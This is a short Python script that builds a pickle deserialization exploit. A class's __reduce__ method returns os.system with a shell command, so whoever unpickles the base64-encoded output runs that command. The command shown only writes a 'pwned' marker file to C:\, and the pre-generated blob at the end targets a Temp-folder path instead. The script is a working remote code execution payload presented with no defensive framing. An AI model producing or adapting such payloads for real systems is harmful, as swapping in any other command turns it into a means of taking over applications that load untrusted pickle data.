import pickle
import os
import base64

class RCEPayload(object):
    def __reduce__(self):
        # temp_path = os.environ.get("TEMP", "C:\\")
        cmd = f'echo pwned > C:\\pwned_by_pickle.txt'
        return (os.system, (cmd,))

payload = pickle.dumps(RCEPayload())
b64_payload = base64.b64encode(payload).decode()

print(b64_payload)

'''
gASVWgAAAAAAAACMAm50lIwGc3lzdGVtlJOUjEJlY2hvIHB3bmVkID4gQzpcVXNlcnNcQWRtaW5cQXBwRGF0YVxMb2NhbFxUZW1wXHB3bmVkX2J5X3BpY2tsZS50eHSUhZRSlC4=
'''